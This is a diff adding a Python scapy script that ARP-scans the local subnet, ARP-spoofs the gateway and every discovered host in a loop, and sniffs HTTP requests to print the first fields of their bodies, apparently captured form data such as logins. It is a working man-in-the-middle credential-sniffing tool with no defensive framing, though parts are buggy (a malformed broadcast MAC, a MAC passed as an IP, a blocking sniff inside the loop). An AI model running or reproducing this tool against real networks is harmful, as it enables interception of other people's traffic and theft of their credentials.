@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+from scapy.layers.http import *
+import os
+import re
+import scapy.all as scapy
+import time 
+import netifaces
+import sys
+def id(pkg):
+    if (pkg.haslayer(HTTPRequest)):
+        ppp=pkg[scapy.Raw].load
+        print(ppp.split("&")[0])
+        print(ppp.split("&")[1])
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="f:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast,
+    timeout=1, verbose=False)[0]
+    return (answered_list[0][1].hwsrc)
+def spoof(target_ip, spoof_ip,tmac):
+    packet = scapy.ARP(op=2, pdst=target_ip,
+    hwdst=tmac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+    #print 1
+def get_local_ip_address():
+    try:
+        import netifaces
+    except ImportError:
+        try:
+            command_to_execute = "pip install netifaces || easy_install netifaces"
+            os.system(command_to_execute)
+        except OSError:
+            print "Can NOT install netifaces, Aborted!"
+            sys.exit(1)
+        import netifaces
+
+    routingIPAddr = '127.0.0.1'
+    for interface in netifaces.interfaces():
+        if interface == netifaces.gateways()['default'][netifaces.AF_INET][1]:
+            routingIPAddr=str(netifaces.gateways()['default'][netifaces.AF_INET][0])
+            
+    return routingIPAddr
+
+a=get_local_ip_address()
+a=str(a)
+ans = scapy.arping(a+"/24",verbose=0)[0]
+rmac=get_mac(a)
+for element in ans:
+    if (rmac!=element[1].hwsrc):
+        print (element[1].psrc+ "\t\t" +element[1].hwsrc)
+for element in ans:
+    if (rmac!=element[1].hwsrc):
+        #print element[1].psrc
+        spoof(a,element[1].hwsrc,rmac)
+        spoof(element[1].psrc,a,element[1].hwsrc)
+while True:
+    for element in ans:
+        if (rmac!=element[1].hwsrc):
+            spoof(a,element[1].psrc,rmac)
+            spoof(element[1].psrc,a,element[1].hwsrc)
+            scapy.sniff(prn=id,store=0)
+    time.sleep(2)
